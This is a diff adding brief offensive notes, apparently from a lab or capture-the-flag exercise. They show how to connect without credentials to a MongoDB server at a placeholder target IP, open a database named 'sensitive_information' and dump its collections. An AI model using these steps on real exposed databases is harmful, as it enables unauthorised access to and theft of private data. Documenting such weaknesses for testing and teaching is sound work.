@@ -1,0 +1,19 @@
+Installing mongo client:
+  curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz
+  tar xvf mongodb-linux-x86_64-3.4.7.tgz
+  cd mongodb-linux-x86_64-3.4.7/bin
+
+Connecting to mongodb database:
+  ./mongo mongodb://{TARGET_IP}:27017
+
+List databases:
+  show dbs;
+
+Select database:
+  use sensitive_information;
+
+List collections:
+  show collections;
+
+Dump the contents of collection/document:
+  db.<COLLECTION>.find().pretty();
